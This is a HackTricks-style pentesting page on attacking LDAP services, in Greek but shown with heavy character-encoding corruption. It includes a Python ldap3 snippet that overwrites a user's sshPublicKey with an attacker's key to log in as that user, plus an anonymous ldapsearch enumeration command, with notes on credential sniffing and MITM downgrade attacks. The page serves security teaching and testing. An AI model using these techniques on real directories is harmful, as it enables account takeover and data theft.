# 389, 636, 3268, 3269 - Î•Î»ÎµÎ³ÎºÏ„Î¹ÎºÎ® Î´Î¿ÎºÎ¹Î¼Î® LDAP

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

Î— Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… **LDAP** (Lightweight Directory Access Protocol) Î³Î¯Î½ÎµÏ„Î±Î¹ ÎºÏ…ÏÎ¯Ï‰Ï‚ Î³Î¹Î± Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Î´Î¹Î¬Ï†Î¿ÏÏ‰Î½ Î¿Î½Ï„Î¿Ï„Î®Ï„Ï‰Î½, ÏŒÏ€Ï‰Ï‚ Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼ÏÎ½, Î±Ï„ÏŒÎ¼Ï‰Î½ ÎºÎ±Î¹ Ï€ÏŒÏÏ‰Î½ ÏŒÏ€Ï‰Ï‚ Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Î¹ ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚, ÎµÎ½Ï„ÏŒÏ‚ Î´Î¹ÎºÏ„ÏÏ‰Î½, Ï„ÏŒÏƒÎ¿ Î´Î·Î¼ÏŒÏƒÎ¹Ï‰Î½ ÏŒÏƒÎ¿ ÎºÎ±Î¹ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏÎ½. Î ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î¼Î¹Î± Î±Ï€Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· ÏƒÎµ ÏƒÏÎ³ÎºÏÎ¹ÏƒÎ· Î¼Îµ Ï„Î¿Î½ Ï€ÏÎ¿ÎºÎ¬Ï„Î¿Ï‡ÏŒ Ï„Î¿Ï…, Ï„Î¿ DAP, Î­Ï‡Î¿Î½Ï„Î±Ï‚ Î­Î½Î±Î½ Î¼Î¹ÎºÏÏŒÏ„ÎµÏÎ¿ ÎºÏÎ´Î¹ÎºÎ±.

ÎŸÎ¹ ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Î¹ LDAP ÎµÎ¯Î½Î±Î¹ Î´Î¿Î¼Î·Î¼Î­Î½Î¿Î¹ Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î· Î´Î¹Î±Î½Î¿Î¼Î® Ï„Î¿Ï…Ï‚ ÏƒÎµ Î±ÏÎºÎµÏ„Î¿ÏÏ‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚, Î¼Îµ ÎºÎ¬Î¸Îµ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î½Î± Ï†Î¹Î»Î¿Î¾ÎµÎ½ÎµÎ¯ Î¼Î¹Î± Î±Î½Ï„Î¹Î³ÏÎ±Ï†Î® ÎºÎ±Î¹ ÏƒÏ…Î³Ï‡ÏÎ¿Î½Î¹ÏƒÎ¼Î­Î½Î· Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…, Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ Ï‰Ï‚ Directory System Agent (DSA). Î— ÎµÏ…Î¸ÏÎ½Î· Î³Î¹Î± Ï„Î·Î½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± Ï„Ï‰Î½ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® LDAP, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½ÎµÎ¯ Î¼Îµ Î¬Î»Î»Î± DSAs ÏŒÏ€Ï‰Ï‚ Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ¬ÏƒÏ‡ÎµÎ¹ Î¼Î¹Î± ÎµÎ½Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· ÏƒÏ„Î¿Î½ Î±Î¹Ï„Î¿ÏÎ½Ï„Î±.

Î— Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ· Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… LDAP Î¼Î¿Î¹Î¬Î¶ÎµÎ¹ Î¼Îµ Î¼Î¹Î± **Î¹ÎµÏÎ±ÏÏ‡Î¯Î± Î´Î­Î½Ï„ÏÎ¿Ï…, Î¾ÎµÎºÎ¹Î½ÏÎ½Ï„Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿Î½ ÏÎ¹Î¶Î¹ÎºÏŒ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ ÏƒÏ„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î®**. Î‘Ï…Ï„ÏŒ ÎºÎ»Î±Î´ÎµÏÎµÎ¹ ÏƒÎµ Ï‡ÏÏÎµÏ‚, Î¿Î¹ Î¿Ï€Î¿Î¯ÎµÏ‚ Î´Î¹Î±Î¹ÏÎ¿ÏÎ½Ï„Î±Î¹ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ ÏƒÎµ Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼Î¿ÏÏ‚ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÏƒÎµ Î¿ÏÎ³Î±Î½Ï‰Ï„Î¹ÎºÎ­Ï‚ Î¼Î¿Î½Î¬Î´ÎµÏ‚ Ï€Î¿Ï… Î±Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎ¿Ï…Î½ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Î´Î¹Î±Î¹ÏÎ­ÏƒÎµÎ¹Ï‚ Î® Ï„Î¼Î®Î¼Î±Ï„Î±, Ï†Ï„Î¬Î½Î¿Î½Ï„Î±Ï‚ Ï„ÎµÎ»Î¹ÎºÎ¬ ÏƒÏ„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Ï„Ï‰Î½ Î±Ï„Î¿Î¼Î¹ÎºÏÎ½ Î¿Î½Ï„Î¿Ï„Î®Ï„Ï‰Î½, Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ Ï„ÏŒÏƒÎ¿ Î±Î½Î¸ÏÏÏ€Ï‰Î½ ÏŒÏƒÎ¿ ÎºÎ±Î¹ ÎºÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Ï‰Î½ Ï€ÏŒÏÏ‰Î½, ÏŒÏ€Ï‰Ï‚ Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Î¹ ÎµÎºÏ„Ï…Ï€Ï‰Ï„Î­Ï‚.

**Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î¸ÏÏÎ±:** 389 ÎºÎ±Î¹ 636 (ldaps). ÎŸ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ Global Catalog (LDAP ÏƒÏ„Î¿ ActiveDirectory) ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿Ï‚ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÏƒÏ„Î¹Ï‚ Î¸ÏÏÎµÏ‚ 3268 ÎºÎ±Î¹ 3269 Î³Î¹Î± Ï„Î¿ LDAPS.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### ÎœÎ¿ÏÏ†Î® Î‘Î½Ï„Î±Î»Î»Î±Î³Î®Ï‚ Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ LDAP

Î— LDIF (LDAP Data Interchange Format) ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… Ï‰Ï‚ Î­Î½Î± ÏƒÏÎ½Î¿Î»Î¿ ÎµÎ³Î³ÏÎ±Ï†ÏÎ½. ÎœÏ€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î±Î½Î±Ï€Î±ÏÎ±ÏƒÏ„Î®ÏƒÎµÎ¹ Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ·Ï‚ (Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ·, Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ·, Î”Î¹Î±Î³ÏÎ±Ï†Î®, ÎœÎµÏ„Î¿Î½Î¿Î¼Î±ÏƒÎ¯Î±).
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* ÎŸÎ¹ Î³ÏÎ±Î¼Î¼Î­Ï‚ 1-3 ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿Î½ Ï„Î¿Î¼Î­Î± Î±Î½ÏÏ„Î±Ï„Î¿Ï… ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… local
* ÎŸÎ¹ Î³ÏÎ±Î¼Î¼Î­Ï‚ 5-8 ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿Î½ Ï„Î¿Î¼Î­Î± Ï€ÏÏÏ„Î¿Ï… ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… moneycorp (moneycorp.local)
* ÎŸÎ¹ Î³ÏÎ±Î¼Î¼Î­Ï‚ 10-16 ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Ï…Î½ 2 Î¿ÏÎ³Î±Î½Ï‰Ï„Î¹ÎºÎ­Ï‚ Î¼Î¿Î½Î¬Î´ÎµÏ‚: dev ÎºÎ±Î¹ sales
* ÎŸÎ¹ Î³ÏÎ±Î¼Î¼Î­Ï‚ 18-26 Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¿ÏÎ½ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï„Î¿Ï… Ï„Î¿Î¼Î­Î± ÎºÎ±Î¹ Î±Î½Î±Î¸Î­Ï„Î¿Ï…Î½ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¹Î¼Î­Ï‚

## Î•Î³Î³ÏÎ±Ï†Î® Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Ï„Î¹Î¼Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï€Î¿Î»Ï ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Ï†Î±Î½Ï„Î±ÏƒÏ„ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ **Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ "sshPublicKey"** Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÎ±Ï‚ Î® Î¿Ï€Î¿Î¹Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·. Î•Î¯Î½Î±Î¹ Ï€Î¿Î»Ï Ï€Î¹Î¸Î±Î½ÏŒ ÏŒÏ„Î¹ Î±Î½ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹, Ï„ÏŒÏ„Îµ **Ï„Î¿ ssh Î´Î¹Î±Î²Î¬Î¶ÎµÎ¹ Ï„Î± Î´Î·Î¼ÏŒÏƒÎ¹Î± ÎºÎ»ÎµÎ¹Î´Î¹Î¬ Î±Ï€ÏŒ Ï„Î¿ LDAP**. Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÎµÎ½ÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î·, **Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ Ï‰Ï‚ Î±Ï…Ï„ÏŒÏ‚ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±ÎºÏŒÎ¼Î± ÎºÎ¹ Î±Î½ Î· ÎµÎ»Î­Î³Ï‡Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ ÏƒÏ„Î¿ ssh**.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## ÎšÎ±Ï„Î±Î³ÏÎ±Ï†Î® Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿

Î•Î¬Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ LDAP Ï‡Ï‰ÏÎ¯Ï‚ SSL, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿** ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿.

Î•Ï€Î¯ÏƒÎ·Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· **MITM (Man-in-the-Middle)** ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿ **Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® LDAP ÎºÎ±Î¹ Ï„Î¿Ï… Ï€ÎµÎ»Î¬Ï„Î·**. Î•Î´Ï Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· **Downgrade** ÏÏƒÏ„Îµ Î¿ Ï€ÎµÎ»Î¬Ï„Î·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î± **Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿** Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯.

**Î•Î¬Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ SSL**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· **MITM** ÏŒÏ€Ï‰Ï‚ Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†Î·ÎºÎµ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰, Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Î½Ï„Î±Ï‚ Î­Î½Î± **ÏˆÎµÏÏ„Î¹ÎºÎ¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏŒ**. Î•Î¬Î½ Î¿ **Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï„Î¿ Î±Ï€Î¿Î´ÎµÏ‡Î¸ÎµÎ¯**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï…Ï€Î¿Î²Î¬Î¸Î¼Î¹ÏƒÎ· Ï„Î·Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î½Î± Î´ÎµÎ¯Ï„Îµ Î¾Î±Î½Î¬ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±.

## Î‘Î½ÏÎ½Ï…Î¼Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·

### Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· ÎµÎ»Î­Î³Ï‡Î¿Ï… TLS SNI

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ [**Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î±Î½Î¬Î»Ï…ÏƒÎ·**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/), Î±Ï€Î»Î¬ Î¼Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® LDAP Î¼Îµ Î­Î½Î±Î½ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ Ï„Î¿Î¼Î­Î± (ÏŒÏ€Ï‰Ï‚ company.com), Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÎ¹ Î¼Îµ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± LDAP ÎºÎ±Î¹ Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï‰Ï‚ Î±Î½ÏÎ½Ï…Î¼Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚:
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### Î‘Î½ÏÎ½Ï…Î¼ÎµÏ‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ LDAP

ÎŸÎ¹ **Î±Î½ÏÎ½Ï…Î¼ÎµÏ‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ LDAP** ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ ÏƒÎµ **Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚** Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎ¿Ï…Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€ÏŒ Ï„Î¿Î½ Ï„Î¿Î¼Î­Î±, ÏŒÏ€Ï‰Ï‚ Î¼Î¹Î± Ï€Î»Î®ÏÎ·Ï‚ Î»Î¯ÏƒÏ„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½, Î¿Î¼Î¬Î´Ï‰Î½, Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„ÏÎ½, Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… Ï„Î¿Î¼Î­Î±. Î‘Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **Ï€Î±Î»Î±Î¹Î¬ ÏÏÎ¸Î¼Î¹ÏƒÎ·** ÎºÎ±Î¹ Î±Ï€ÏŒ Ï„Î¿ Windows Server 2003 ÎºÎ±Î¹ Î¼ÎµÏ„Î¬, Î¼ÏŒÎ½Î¿ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î±Î¹Ï„Î®Î¼Î±Ï„Î± LDAP.\
